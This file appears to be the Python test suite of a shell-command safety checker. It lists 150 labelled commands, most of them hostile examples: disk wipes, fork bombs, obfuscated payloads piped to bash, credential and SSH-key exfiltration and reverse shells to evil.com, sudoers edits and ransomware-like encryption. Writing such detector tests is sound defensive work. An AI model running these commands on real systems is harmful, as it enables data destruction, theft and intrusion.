#!/usr/bin/env python3
"""
COMPREHENSIVE Safety Validation Testing - 150+ Test Cases
==========================================================
Enterprise-grade safety testing covering:
- Basic command validation
- Advanced obfuscation detection
- Environment variable exploits
- Social engineering patterns
- Resource exhaustion attacks
- Command chaining exploits
- Unicode/encoding attacks
- Timing attacks
- Real-world attack scenarios
"""

import sys
import base64
from typing import Dict, List
from dataclasses import dataclass

from rich.console import Console
from rich.progress import Progress
from rich.table import Table

console = Console()

@dataclass
class SafetyTestResult:
    test_name: str
    passed: bool
    details: str
    category: str  # For grouping


class ComprehensiveSafetyTester:
    """150+ comprehensive safety validation tests"""
    
    def __init__(self):
        self.results: List[SafetyTestResult] = []
    
    def run_test(self, test_name: str, command: str, should_be_safe: bool, 
                 category: str = "General", expected_risk: str = None):
        """Run a single safety test"""
        try:
            from executor.safety_checker import SafetyChecker
            
            checker = SafetyChecker()
            result = checker.check_command(command)
            
            if result.is_safe == should_be_safe:
                self.results.append(SafetyTestResult(test_name, True, "✓", category))
                return True
            else:
                expected = "safe" if should_be_safe else "unsafe"
                actual = "safe" if result.is_safe else "unsafe"
                details = f"Expected {expected}, got {actual} | Risk: {result.risk_level}"
                self.results.append(SafetyTestResult(test_name, False, details, category))
                return False
        except Exception as e:
            self.results.append(SafetyTestResult(test_name, False, f"Exception: {e}", category))
            return False
    
    # ========== SECTION 1: Basic Validation (15 tests) ==========
    
    def test_001_safe_ls_command(self):
        """Safe: Basic ls command"""
        self.run_test("test_001", "ls -la", True, "Basic")
    
    def test_002_safe_pwd_command(self):
        """Safe: Print working directory"""
        self.run_test("test_002", "pwd", True, "Basic")
    
    def test_003_safe_cat_command(self):
        """Safe: Cat file"""
        self.run_test("test_003", "cat README.md", True, "Basic")
    
    def test_004_safe_grep_command(self):
        """Safe: Grep pattern"""
        self.run_test("test_004", "grep 'pattern' file.txt", True, "Basic")
    
    def test_005_safe_find_command(self):
        """Safe: Find files"""
        self.run_test("test_005", "find . -name '*.py'", True, "Basic")
    
    def test_006_safe_echo_command(self):
        """Safe: Echo text"""
        self.run_test("test_006", "echo 'hello world'", True, "Basic")
    
    def test_007_safe_date_command(self):
        """Safe: Show date"""
        self.run_test("test_007", "date", True, "Basic")
    
    def test_008_safe_whoami_command(self):
        """Safe: Show current user"""
        self.run_test("test_008", "whoami", True, "Basic")
    
    def test_009_safe_uptime_command(self):
        """Safe: System uptime"""
        self.run_test("test_009", "uptime", True, "Basic")
    
    def test_010_safe_df_command(self):
        """Safe: Disk space"""
        self.run_test("test_010", "df -h", True, "Basic")
    
    def test_011_safe_ps_command(self):
        """Safe: Process list"""
        self.run_test("test_011", "ps aux", True, "Basic")
    
    def test_012_safe_top_command(self):
        """Safe: System monitor"""
        self.run_test("test_012", "top -n 1", True, "Basic")
    
    def test_013_safe_history_command(self):
        """Safe: Command history"""
        self.run_test("test_013", "history", True, "Basic")
    
    def test_014_safe_which_command(self):
        """Safe: Find executable"""
        self.run_test("test_014", "which python", True, "Basic")
    
    def test_015_safe_head_command(self):
        """Safe: Head of file"""
        self.run_test("test_015", "head -n 10 file.txt", True, "Basic")
    
    # ========== SECTION 2: Critical Threats (20 tests) ==========
    
    def test_016_critical_rm_rf_root(self):
        """Critical: Delete root"""
        self.run_test("test_016", "rm -rf /", False, "Critical")
    
    def test_017_critical_fork_bomb(self):
        """Critical: Fork bomb"""
        self.run_test("test_017", ":(){:|:&};:", False, "Critical")
    
    def test_018_critical_mkfs_disk(self):
        """Critical: Format disk"""
        self.run_test("test_018", "mkfs.ext4 /dev/sda", False, "Critical")
    
    def test_019_critical_dd_zero_disk(self):
        """Critical: Zero disk"""
        self.run_test("test_019", "dd if=/dev/zero of=/dev/sda", False, "Critical")
    
    def test_020_critical_passwd_overwrite(self):
        """Critical: Overwrite passwd"""
        self.run_test("test_020", ">: /etc/passwd", False, "Critical")
    
    def test_021_critical_shadow_overwrite(self):
        """Critical: Overwrite shadow"""
        self.run_test("test_021", ">: /etc/shadow", False, "Critical")
    
    def test_022_critical_delete_var(self):
        """Critical: Delete /var"""
        self.run_test("test_022", "rm -rf /var", False, "Critical")
    
    def test_023_critical_delete_home(self):
        """Critical: Delete /home"""
        self.run_test("test_023", "rm -rf /home", False, "Critical")
    
    def test_024_critical_delete_usr(self):
        """Critical: Delete /usr"""
        self.run_test("test_024", "rm -rf /usr", False, "Critical")
    
    def test_025_critical_delete_boot(self):
        """Critical: Delete /boot"""
        self.run_test("test_025", "rm -rf /boot", False, "Critical")
    
    def test_026_critical_delete_etc(self):
        """Critical: Delete /etc"""
        self.run_test("test_026", "rm -rf /etc", False, "Critical")
    
    def test_027_critical_delete_bin(self):
        """Critical: Delete /bin"""
        self.run_test("test_027", "rm -rf /bin", False, "Critical")
    
    def test_028_critical_delete_sbin(self):
        """Critical: Delete /sbin"""
        self.run_test("test_028", "rm -rf /sbin", False, "Critical")
    
    def test_029_critical_delete_lib(self):
        """Critical: Delete /lib"""
        self.run_test("test_029", "rm -rf /lib", False, "Critical")
    
    def test_030_critical_kernel_panic(self):
        """Critical: Trigger kernel panic"""
        self.run_test("test_030", "echo c > /proc/sysrq-trigger", False, "Critical")
    
    def test_031_critical_reboot_immediate(self):
        """Critical: Immediate reboot"""
        self.run_test("test_031", "reboot -f", False, "Critical")
    
    def test_032_critical_halt_system(self):
        """Critical: Halt system"""
        self.run_test("test_032", "halt -p", False, "Critical")
    
    def test_033_critical_destroy_mbr(self):
        """Critical: Destroy MBR"""
        self.run_test("test_033", "dd if=/dev/zero of=/dev/sda bs=512 count=1", False, "Critical")
    
    def test_034_critical_partition_table_wipe(self):
        """Critical: Wipe partition table"""
        self.run_test("test_034", "dd if=/dev/zero of=/dev/sda bs=1M count=1", False, "Critical")
    
    def test_035_critical_random_overwrite_disk(self):
        """Critical: Random data to disk"""
        self.run_test("test_035", "dd if=/dev/urandom of=/dev/sda", False, "Critical")
    
    # ========== SECTION 3: Obfuscation Detection (25 tests) ==========
    
    def test_036_base64_encoded_rm(self):
        """Obfuscation: Base64 encoded rm"""
        # "rm -rf /" encoded in base64
        cmd = "echo 'cm0gLXJmIC8=' | base64 -d | bash"
        self.run_test("test_036", cmd, False, "Obfuscation")
    
    def test_037_hex_encoded_command(self):
        """Obfuscation: Hex encoded"""
        cmd = "echo '\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f' | bash"
        self.run_test("test_037", cmd, False, "Obfuscation")
    
    def test_038_url_encoded_command(self):
        """Obfuscation: URL encoded"""
        cmd = "curl -s 'http://evil.com/rm%20-rf%20%2F' | bash"
        self.run_test("test_038", cmd, False, "Obfuscation")
    
    def test_039_unicode_obfuscation(self):
        """Obfuscation: Unicode tricks"""
        cmd = "rm ‐rf /"  # Using unicode dash (U+2010)
        self.run_test("test_039", cmd, False, "Obfuscation")
    
    def test_040_homoglyph_attack(self):
        """Obfuscation: Homoglyph characters"""
        cmd = "rⅿ -rf /"  # Roman numeral ⅿ instead of m
        self.run_test("test_040", cmd, False, "Obfuscation")
    
    def test_041_zero_width_characters(self):
        """Obfuscation: Zero-width characters"""
        cmd = "rm\u200B -rf /"  # Zero-width space
        self.run_test("test_041", cmd, False, "Obfuscation")
    
    def test_042_rtl_override(self):
        """Obfuscation: RTL override"""
        cmd = "rm \u202E-rf /"  # Right-to-left override
        self.run_test("test_042", cmd, False, "Obfuscation")
    
    def test_043_comment_hiding(self):
        """Obfuscation: Comment hiding"""
        cmd = "ls # rm -rf /"
        self.run_test("test_043", cmd, True, "Obfuscation")  # Actually safe
    
    def test_044_whitespace_obfuscation(self):
        """Obfuscation: Excessive whitespace"""
        cmd = "rm      -rf      /"
        self.run_test("test_044", cmd, False, "Obfuscation")
    
    def test_045_case_variation_evasion(self):
        """Obfuscation: Case variation"""
        cmd = "Rm -Rf /"
        self.run_test("test_045", cmd, False, "Obfuscation")
    
    def test_046_escape_sequence_abuse(self):
        """Obfuscation: Escape sequences"""
        cmd = "r\\m -r\\f /"
        self.run_test("test_046", cmd, False, "Obfuscation")
    
    def test_047_shell_variable_exploit(self):
        """Obfuscation: Shell variable"""
        cmd = "CMD='rm -rf /'; $CMD"
        self.run_test("test_047", cmd, False, "Obfuscation")
    
    def test_048_command_substitution_nested(self):
        """Obfuscation: Nested substitution"""
        cmd = "$(echo rm -rf /)"
        self.run_test("test_048", cmd, False, "Obfuscation")
    
    def test_049_heredoc_exploitation(self):
        """Obfuscation: Heredoc trick"""
        cmd = "bash << EOF\nrm -rf /\nEOF"
        self.run_test("test_049", cmd, False, "Obfuscation")
    
    def test_050_process_substitution(self):
        """Obfuscation: Process substitution"""
        cmd = "bash <(echo rm -rf /)"
        self.run_test("test_050", cmd, False, "Obfuscation")
    
    def test_051_brace_expansion(self):
        """Obfuscation: Brace expansion"""
        cmd = "rm -rf /{bin,etc,usr}"
        self.run_test("test_051", cmd, False, "Obfuscation")
    
    def test_052_glob_pattern_abuse(self):
        """Obfuscation: Glob patterns"""
        cmd = "rm -rf /*"
        self.run_test("test_052", cmd, False, "Obfuscation")
    
    def test_053_arithmetic_expansion(self):
        """Obfuscation: Arithmetic expansion"""
        cmd = "rm -rf $((1-1))"  # Evaluates to 0
        self.run_test("test_053", cmd, False, "Obfuscation")
    
    def test_054_parameter_expansion(self):
        """Obfuscation: Parameter expansion"""
        cmd = "CMD=rm; $CMD -rf /"
        self.run_test("test_054", cmd, False, "Obfuscation")
    
    def test_055_alias_exploitation(self):
        """Obfuscation: Alias abuse"""
        cmd = "alias x='rm -rf /'; x"
        self.run_test("test_055", cmd, False, "Obfuscation")
    
    def test_056_base32_encoding(self):
        """Obfuscation: Base32 encoded"""
        cmd = "echo 'MJQXGZJTGE======' | base32 -d | bash"
        self.run_test("test_056", cmd, False, "Obfuscation")
    
    def test_057_rot13_encoding(self):
        """Obfuscation: ROT13 encoded"""
        cmd = "echo 'ez -es /' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash"
        self.run_test("test_057", cmd, False, "Obfuscation")
    
    def test_058_uuencode_trick(self):
        """Obfuscation: UUencode"""
        cmd = "uudecode -o /tmp/script << EOF\nbegin 755 script\n...\nend\nEOF"
        self.run_test("test_058", cmd, False, "Obfuscation")
    
    def test_059_xxd_hex_dump(self):
        """Obfuscation: xxd reverse"""
        cmd = "echo '726d202d7266202f' | xxd -r -p | bash"
        self.run_test("test_059", cmd, False, "Obfuscation")
    
    def test_060_gzip_compressed_command(self):
        """Obfuscation: Gzip compressed"""
        cmd = "echo 'H4sIAAAA...' | base64 -d | gunzip | bash"
        self.run_test("test_060", cmd, False, "Obfuscation")
    
    # ========== SECTION 4: Environment Variable Exploits (20 tests) ==========
    
    def test_061_path_injection(self):
        """EnvExploit: PATH injection"""
        cmd = "PATH=/tmp:$PATH; ls"
        self.run_test("test_061", cmd, False, "Environment")
    
    def test_062_ld_preload_exploit(self):
        """EnvExploit: LD_PRELOAD"""
        cmd = "LD_PRELOAD=/tmp/evil.so ls"
        self.run_test("test_062", cmd, False, "Environment")
    
    def test_063_ld_library_path_exploit(self):
        """EnvExploit: LD_LIBRARY_PATH"""
        cmd = "LD_LIBRARY_PATH=/tmp ls"
        self.run_test("test_063", cmd, False, "Environment")
    
    def test_064_shell_opts_abuse(self):
        """EnvExploit: SHELLOPTS"""
        cmd = "SHELLOPTS=xtrace:errexit; rm file.txt"
        self.run_test("test_064", cmd, False, "Environment")
    
    def test_065_locale_exploitation(self):
        """EnvExploit: LOCALE manipulation"""
        cmd = "LC_ALL=C.UTF-8 evil_program"
        self.run_test("test_065", cmd, False, "Environment")
    
    def test_066_timezone_manipulation(self):
        """EnvExploit: TZ variable"""
        cmd = "TZ=:/etc/passwd date"
        self.run_test("test_066", cmd, False, "Environment")
    
    def test_067_term_variable_exploit(self):
        """EnvExploit: TERM variable"""
        cmd = "TERM='xterm;rm -rf /' ls"
        self.run_test("test_067", cmd, False, "Environment")
    
    def test_068_ps1_prompt_injection(self):
        """EnvExploit: PS1 injection"""
        cmd = "PS1='$(rm -rf /) > '"
        self.run_test("test_068", cmd, False, "Environment")
    
    def test_069_cdpath_exploitation(self):
        """EnvExploit: CDPATH"""
        cmd = "CDPATH=/tmp cd etc"
        self.run_test("test_069", cmd, False, "Environment")
    
    def test_070_bash_env_exploit(self):
        """EnvExploit: BASH_ENV"""
        cmd = "BASH_ENV=/tmp/malicious.sh bash"
        self.run_test("test_070", cmd, False, "Environment")
    
    def test_071_histfile_manipulation(self):
        """EnvExploit: HISTFILE"""
        cmd = "HISTFILE=/dev/null rm sensitive.txt"
        self.run_test("test_071", cmd, False, "Environment")
    
    def test_072_inputrc_exploit(self):
        """EnvExploit: INPUTRC"""
        cmd = "INPUTRC=/tmp/evil.inputrc bash"
        self.run_test("test_072", cmd, False, "Environment")
    
    def test_073_tmpdir_redirection(self):
        """EnvExploit: TMPDIR"""
        cmd = "TMPDIR=/root program"
        self.run_test("test_073", cmd, False, "Environment")
    
    def test_074_home_spoofing(self):
        """EnvExploit: HOME spoofing"""
        cmd = "HOME=/tmp malicious_app"
        self.run_test("test_074", cmd, False, "Environment")
    
    def test_075_user_variable_manipulation(self):
        """EnvExploit: USER variable"""
        cmd = "USER=root dangerous_operation"
        self.run_test("test_075", cmd, False, "Environment")
    
    def test_076_display_variable_exploit(self):
        """EnvExploit: DISPLAY"""
        cmd = "DISPLAY=:0 xterm -e 'rm -rf /'"
        self.run_test("test_076", cmd, False, "Environment")
    
    def test_077_editor_variable_exploit(self):
        """EnvExploit: EDITOR"""
        cmd = "EDITOR='rm -rf /' crontab -e"
        self.run_test("test_077", cmd, False, "Environment")
    
    def test_078_visual_variable_exploit(self):
        """EnvExploit: VISUAL"""
        cmd = "VISUAL='/bin/evil' visudo"
        self.run_test("test_078", cmd, False, "Environment")
    
    def test_079_pager_variable_exploit(self):
        """EnvExploit: PAGER"""
        cmd = "PAGER='rm -rf /' man ls"
        self.run_test("test_079", cmd, False, "Environment")
    
    def test_080_manpath_manipulation(self):
        """EnvExploit: MANPATH"""
        cmd = "MANPATH=/tmp man evil"
        self.run_test("test_080", cmd, False, "Environment")
    
    # ========== SECTION 5: Social Engineering Patterns (15 tests) - Tests 081-095 ==========
    
    def test_081_social_engineering_sudo_prompt(self):
        """Social: Fake sudo prompt"""
        cmd = "echo 'Password:' && read -s pass && echo $pass > /tmp/stolen"
        self.run_test("test_081", cmd, False, "Social Engineering")
    
    def test_082_typosquatting_command(self):
        """Social: Typosquatting command"""
        cmd = "sl"  # Common typo for 'ls' but could be malicious
        self.run_test("test_082", cmd, True, "Social Engineering")  # May be safe or not
    
    def test_083_fake_update_script(self):
        """Social: Fake system update"""
        cmd = "curl http://evil.com/update.sh | sudo bash"
        self.run_test("test_083", cmd, False, "Social Engineering")
    
    def test_084_credential_harvesting(self):
        """Social: Credential harvesting"""
        cmd = "read -p 'Enter password: ' -s pass && curl -d $pass http://evil.com"
        self.run_test("test_084", cmd, False, "Social Engineering")
    
    def test_085_fake_verification(self):
        """Social: Fake verification script"""
        cmd = "bash <(curl -s http://verify-system.com/check.sh)"
        self.run_test("test_085", cmd, False, "Social Engineering")
    
    def test_086_clipboard_stealing(self):
        """Social: Clipboard stealing"""
        cmd = "xclip -o | curl -d @- http://evil.com/steal"
        self.run_test("test_086", cmd, False, "Social Engineering")
    
    def test_087_keylogger_install(self):
        """Social: Keylogger installation"""
        cmd = "nohup cat /dev/input/event* > /tmp/.keylog &"
        self.run_test("test_087", cmd, False, "Social Engineering")
    
    def test_088_history_exfiltration(self):
        """Social: History exfiltration"""
        cmd = "curl -X POST -d @~/.bash_history http://evil.com/data"
        self.run_test("test_088", cmd, False, "Social Engineering")
    
    def test_089_ssh_key_stealing(self):
        """Social: SSH key theft"""
        cmd = "cat ~/.ssh/id_rsa | curl -d @- http://evil.com/keys"
        self.run_test("test_089", cmd, False, "Social Engineering")
    
    def test_090_browser_cookie_theft(self):
        """Social: Browser cookie theft"""
        cmd = "cat ~/.config/google-chrome/Default/Cookies | base64 | curl -d @- http://evil.com"
        self.run_test("test_090", cmd, False, "Social Engineering")
    
    def test_091_fake_security_scan(self):
        """Social: Fake security scan"""
        cmd = "wget http://security-scan.com/scan.sh && chmod +x scan.sh && ./scan.sh"
        self.run_test("test_091", cmd, False, "Social Engineering")
    
    def test_092_backdoor_injection(self):
        """Social: Backdoor injection"""
        cmd = "echo 'bash -i >& /dev/tcp/evil.com/4444 0>&1' >> ~/.bashrc"
        self.run_test("test_092", cmd, False, "Social Engineering")
    
    def test_093_dns_exfiltration(self):
        """Social: DNS exfiltration"""
        cmd = "cat /etc/passwd | xxd -p | xargs -I {} dig {}.evil.com"
        self.run_test("test_093", cmd, False, "Social Engineering")
    
    def test_094_screenshot_capture(self):
        """Social: Unauthorized screenshot"""
        cmd = "scrot -z /tmp/.screenshot.png && curl -F file=@/tmp/.screenshot.png http://evil.com/upload"
        self.run_test("test_094", cmd, False, "Social Engineering")
    
    def test_095_webcam_activation(self):
        """Social: Webcam activation"""
        cmd = "ffmpeg -f video4linux2 -i /dev/video0 -frames 1 /tmp/webcam.jpg"
        self.run_test("test_095", cmd, False, "Social Engineering")
    
    # ========== SECTION 6: Resource Exhaustion (15 tests) - Tests 096-110 ==========
    
    def test_096_cpu_bomb(self):
        """Resource: CPU bomb"""
        cmd = "while true; do :; done &"
        self.run_test("test_096", cmd, False, "Resource Exhaustion")
    
    def test_097_memory_bomb(self):
        """Resource: Memory bomb"""
        cmd = ":(){ :|: & };:"
        self.run_test("test_097", cmd, False, "Resource Exhaustion")
    
    def test_098_disk_fill_attack(self):
        """Resource: Disk fill"""
        cmd = "dd if=/dev/zero of=/tmp/largefile bs=1M count=1000000"
        self.run_test("test_098", cmd, False, "Resource Exhaustion")
    
    def test_099_inode_exhaustion(self):
        """Resource: Inode exhaustion"""
        cmd = "while true; do touch /tmp/file_$(date +%s%N); done"
        self.run_test("test_099", cmd, False, "Resource Exhaustion")
    
    def test_100_process_bomb(self):
        """Resource: Process bomb"""
        cmd = "for i in {1..10000}; do sleep 1000 & done"
        self.run_test("test_100", cmd, False, "Resource Exhaustion")
    
    def test_101_network_flood(self):
        """Resource: Network flood"""
        cmd = "ping -f 192.168.1.1"
        self.run_test("test_101", cmd, False, "Resource Exhaustion")
    
    def test_102_log_flooding(self):
        """Resource: Log flooding"""
        cmd = "while true; do logger 'spam'; done"
        self.run_test("test_102", cmd, False, "Resource Exhaustion")
    
    def test_103_tmp_exhaustion(self):
        """Resource: /tmp exhaustion"""
        cmd = "cat /dev/zero > /tmp/fill"
        self.run_test("test_103", cmd, False, "Resource Exhaustion")
    
    def test_104_fd_exhaustion(self):
        """Resource: File descriptor exhaustion"""
        cmd = "while true; do exec {fd}<>/dev/null; done"
        self.run_test("test_104", cmd, False, "Resource Exhaustion")
    
    def test_105_swap_thrashing(self):
        """Resource: Swap thrashing"""
        cmd = "stress --vm 10 --vm-bytes 1G --vm-hang 0"
        self.run_test("test_105", cmd, False, "Resource Exhaustion")
    
    def test_106_recursive_compression(self):
        """Resource: Compression bomb"""
        cmd = "yes | gzip | gzip | gzip > /tmp/bomb.gz"
        self.run_test("test_106", cmd, False, "Resource Exhaustion")
    
    def test_107_infinite_pipe(self):
        """Resource: Infinite pipe"""
        cmd = "yes | yes | yes | yes"
        self.run_test("test_107", cmd, False, "Resource Exhaustion")
    
    def test_108_massive_tar_creation(self):
        """Resource: Massive tar bomb"""
        cmd = "tar -czf /tmp/bomb.tar.gz /dev/zero"
        self.run_test("test_108", cmd, False, "Resource Exhaustion")
    
    def test_109_zombie_creation(self):
        """Resource: Zombie process creation"""
        cmd = "for i in {1..1000}; do (sleep 1 &); done"
        self.run_test("test_109", cmd, False, "Resource Exhaustion")
    
    def test_110_pty_exhaustion(self):
        """Resource: PTY exhaustion"""
        cmd = "for i in {1..1000}; do screen -dmS session$i; done"
        self.run_test("test_110", cmd, False, "Resource Exhaustion")
    
    # ========== SECTION 7: Advanced Command Chaining (15 tests) - Tests 111-125 ==========
    
    def test_111_dangerous_pipe_chain(self):
        """Chaining: Dangerous pipe"""
        cmd = "curl http://evil.com/script.sh | bash"
        self.run_test("test_111", cmd, False, "Command Chaining")
    
    def test_112_wget_pipe_execution(self):
        """Chaining: Wget pipe execution"""
        cmd = "wget -qO- http://evil.com/payload | sh"
        self.run_test("test_112", cmd, False, "Command Chaining")
    
    def test_113_nested_command_substitution(self):
        """Chaining: Nested substitution"""
        cmd = "$(echo $(echo rm -rf /))"
        self.run_test("test_113", cmd, False, "Command Chaining")
    
    def test_114_conditional_destruction(self):
        """Chaining: Conditional destruction"""
        cmd = "test -d /home && rm -rf /home"
        self.run_test("test_114", cmd, False, "Command Chaining")
    
    def test_115_backgrounded_malicious(self):
        """Chaining: Backgrounded malicious"""
        cmd = "nohup rm -rf / > /dev/null 2>&1 &"
        self.run_test("test_115", cmd, False, "Command Chaining")
    
    def test_116_sudo_chaining(self):
        """Chaining: Sudo with dangerous command"""
        cmd = "sudo sh -c 'rm -rf /var'"
        self.run_test("test_116", cmd, False, "Command Chaining")
    
    def test_117_eval_injection(self):
        """Chaining: Eval injection"""
        cmd = "eval 'rm -rf /'"
        self.run_test("test_117", cmd, False, "Command Chaining")
    
    def test_118_xargs_exploitation(self):
        """Chaining: Xargs exploitation"""
        cmd = "echo '/' | xargs rm -rf"
        self.run_test("test_118", cmd, False, "Command Chaining")
    
    def test_119_find_exec_danger(self):
        """Chaining: Find exec danger"""
        cmd = "find / -name '*' -exec rm {} \\;"
        self.run_test("test_119", cmd, False, "Command Chaining")
    
    def test_120_parallel_destruction(self):
        """Chaining: Parallel execution"""
        cmd = "parallel rm -rf ::: / /home /var /usr"
        self.run_test("test_120", cmd, False, "Command Chaining")
    
    def test_121_tee_overwrite_critical(self):
        """Chaining: Tee overwrite"""
        cmd = "echo '' | sudo tee /etc/passwd"
        self.run_test("test_121", cmd, False, "Command Chaining")
    
    def test_122_awk_system_call(self):
        """Chaining: Awk system call"""
        cmd = "awk 'BEGIN {system(\"rm -rf /\")}'"
        self.run_test("test_122", cmd, False, "Command Chaining")
    
    def test_123_perl_oneliner_danger(self):
        """Chaining: Perl one-liner"""
        cmd = "perl -e 'system(\"rm -rf /\")'"
        self.run_test("test_123", cmd, False, "Command Chaining")
    
    def test_124_python_exec_danger(self):
        """Chaining: Python exec"""
        cmd = "python -c 'import os; os.system(\"rm -rf /\")'"
        self.run_test("test_124", cmd, False, "Command Chaining")
    
    def test_125_sed_execution_trick(self):
        """Chaining: Sed execution"""
        cmd = "sed 's/.*/rm -rf \\//' /etc/hosts | bash"
        self.run_test("test_125", cmd, False, "Command Chaining")
    
    # ========== SECTION 8: Network-based Attacks (15 tests) - Tests 126-140 ==========
    
    def test_126_reverse_shell(self):
        """Network: Reverse shell"""
        cmd = "bash -i >& /dev/tcp/evil.com/4444 0>&1"
        self.run_test("test_126", cmd, False, "Network Attack")
    
    def test_127_netcat_backdoor(self):
        """Network: Netcat backdoor"""
        cmd = "nc -e /bin/bash evil.com 4444"
        self.run_test("test_127", cmd, False, "Network Attack")
    
    def test_128_socat_reverse_shell(self):
        """Network: Socat reverse shell"""
        cmd = "socat TCP:evil.com:4444 EXEC:/bin/bash"
        self.run_test("test_128", cmd, False, "Network Attack")
    
    def test_129_curl_exfiltration(self):
        """Network: Curl exfiltration"""
        cmd = "tar czf - /home | curl -X POST -d @- http://evil.com/upload"
        self.run_test("test_129", cmd, False, "Network Attack")
    
    def test_130_dns_tunnel(self):
        """Network: DNS tunneling"""
        cmd = "cat /etc/passwd | base64 | while read line; do dig $line.evil.com; done"
        self.run_test("test_130", cmd, False, "Network Attack")
    
    def test_131_icmp_tunnel(self):
        """Network: ICMP tunneling"""
        cmd = "ptunnel -p evil.com -lp 8000 -da localhost -dp 22"
        self.run_test("test_131", cmd, False, "Network Attack")
    
    def test_132_port_scan(self):
        """Network: Port scanning"""
        cmd = "nmap -sS -p- target.com"
        self.run_test("test_132", cmd, False, "Network Attack")
    
    def test_133_arp_spoofing(self):
        """Network: ARP spoofing"""
        cmd = "arpspoof -i eth0 -t 192.168.1.1 192.168.1.100"
        self.run_test("test_133", cmd, False, "Network Attack")
    
    def test_134_mitm_attack(self):
        """Network: MITM setup"""
        cmd = "ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//"
        self.run_test("test_134", cmd, False, "Network Attack")
    
    def test_135_packet_sniffing(self):
        """Network: Packet sniffing"""
        cmd = "tcpdump -i eth0 -w /tmp/capture.pcap"
        self.run_test("test_135", cmd, False, "Network Attack")
    
    def test_136_wifi_deauth(self):
        """Network: WiFi deauth"""
        cmd = "aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon"
        self.run_test("test_136", cmd, False, "Network Attack")
    
    def test_137_syn_flood(self):
        """Network: SYN flood"""
        cmd = "hping3 -S --flood -V target.com"
        self.run_test("test_137", cmd, False, "Network Attack")
    
    def test_138_slowloris_attack(self):
        """Network: Slowloris"""
        cmd = "slowloris -s 200 target.com"
        self.run_test("test_138", cmd, False, "Network Attack")
    
    def test_139_ssh_brute_force(self):
        """Network: SSH brute force"""
        cmd = "hydra -l admin -P passwords.txt ssh://target.com"
        self.run_test("test_139", cmd, False, "Network Attack")
    
    def test_140_ftp_bounce_attack(self):
        """Network: FTP bounce"""
        cmd = "nmap -b ftp.server.com target.com"
        self.run_test("test_140", cmd, False, "Network Attack")
    
    # ========== SECTION 9: Real-World Attack Scenarios (10 tests) - Tests 141-150 ==========
    
    def test_141_ransomware_simulation(self):
        """RealWorld: Ransomware-like behavior"""
        cmd = "find /home -type f -exec openssl enc -aes-256-cbc -in {} -out {}.enc -k secret -pbkdf2 \\; -exec rm {} \\;"
        self.run_test("test_141", cmd, False, "Real-World")
    
    def test_142_cryptominer_install(self):
        """RealWorld: Cryptominer"""
        cmd = "curl -o /tmp/miner http://evil.com/xmrig && chmod +x /tmp/miner && /tmp/miner"
        self.run_test("test_142", cmd, False, "Real-World")
    
    def test_143_privilege_escalation(self):
        """RealWorld: Privilege escalation"""
        cmd = "echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers"
        self.run_test("test_143", cmd, False, "Real-World")
    
    def test_144_rootkit_installation(self):
        """RealWorld: Rootkit install"""
        cmd = "wget http://evil.com/rootkit.tar.gz && tar xzf rootkit.tar.gz && cd rootkit && ./install.sh"
        self.run_test("test_144", cmd, False, "Real-World")
    
    def test_145_log_wiping(self):
        """RealWorld: Log wiping"""
        cmd = "echo '' > /var/log/auth.log && echo '' > /var/log/syslog && echo '' > ~/.bash_history"
        self.run_test("test_145", cmd, False, "Real-World")
    
    def test_146_persistence_mechanism(self):
        """RealWorld: Persistence"""
        cmd = "echo '@reboot /tmp/backdoor' | crontab -"
        self.run_test("test_146", cmd, False, "Real-World")
    
    def test_147_data_exfiltration_staged(self):
        """RealWorld: Staged exfiltration"""
        cmd = "tar czf /tmp/.backup.tar.gz /home && curl -F file=@/tmp/.backup.tar.gz http://evil.com/upload && rm /tmp/.backup.tar.gz"
        self.run_test("test_147", cmd, False, "Real-World")
    
    def test_148_supply_chain_attack(self):
        """RealWorld: Supply chain"""
        cmd = "npm install malicious-package && node -e 'require(\"malicious-package\")'"
        self.run_test("test_148", cmd, False, "Real-World")
    
    def test_149_container_escape(self):
        """RealWorld: Container escape"""
        cmd = "docker run --privileged -v /:/host alpine chroot /host"
        self.run_test("test_149", cmd, False, "Real-World")
    
    def test_150_kernel_module_injection(self):
        """RealWorld: Kernel module"""
        cmd = "insmod /tmp/malicious.ko"
        self.run_test("test_150", cmd, False, "Real-World")
    
    # ========== SECTION 10: Summary and Reporting ==========
    
    def run_all_tests(self) -> Dict:
        """Run all 150+ safety tests"""
        console.print("\n[bold cyan]═══ Running Comprehensive Safety Tests (150+ cases) ═══[/bold cyan]\n")
        
        # Collect all test methods
        test_methods = []
        for attr_name in dir(self):
            if attr_name.startswith('test_'):
                test_func = getattr(self, attr_name)
                if callable(test_func):
                    test_name = test_func.__doc__ or attr_name
                    test_methods.append((test_func, test_name.strip()))
        
        # Sort by test number
        test_methods.sort(key=lambda x: x[1])
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Running safety tests...", total=len(test_methods))
            
            for test_func, test_name in test_methods:
                test_func()
                progress.advance(task)
        
        # Calculate metrics
        passed = sum(1 for r in self.results if r.passed)
        failed = sum(1 for r in self.results if not r.passed)
        total = len(self.results)
        success_rate = (passed / total * 100) if total > 0 else 0
        
        # Category-wise metrics
        category_stats = {}
        for result in self.results:
            if result.category not in category_stats:
                category_stats[result.category] = {"passed": 0, "failed": 0}
            if result.passed:
                category_stats[result.category]["passed"] += 1
            else:
                category_stats[result.category]["failed"] += 1
        
        return {
            "total_tests": total,
            "tests_passed": passed,
            "tests_failed": failed,
            "success_rate": success_rate,
            "category_stats": category_stats,
            "test_details": [(r.test_name, "PASS" if r.passed else "FAIL", r.details, r.category) 
                           for r in self.results]
        }
    
    def display_results(self, results: Dict):
        """Display comprehensive test results"""
        # Overall results table
        table = Table(title="Comprehensive Safety Validation Results")
        table.add_column("Test", style="cyan", width=50)
        table.add_column("Status", style="white")
        table.add_column("Category", style="yellow", width=20)
        table.add_column("Details", style="white", width=40)
        
        for test_name, status, details, category in results["test_details"]:
            color = "green" if status == "PASS" else "red"
            table.add_row(
                test_name[:50],
                f"[{color}]{status}[/{color}]",
                category,
                details[:40]
            )
        
        console.print(table)
        
        # Category-wise summary
        console.print("\n[bold]Category-wise Results:[/bold]")
        cat_table = Table()
        cat_table.add_column("Category", style="cyan")
        cat_table.add_column("Passed", style="green")
        cat_table.add_column("Failed", style="red")
        cat_table.add_column("Success Rate", style="yellow")
        
        for category, stats in results["category_stats"].items():
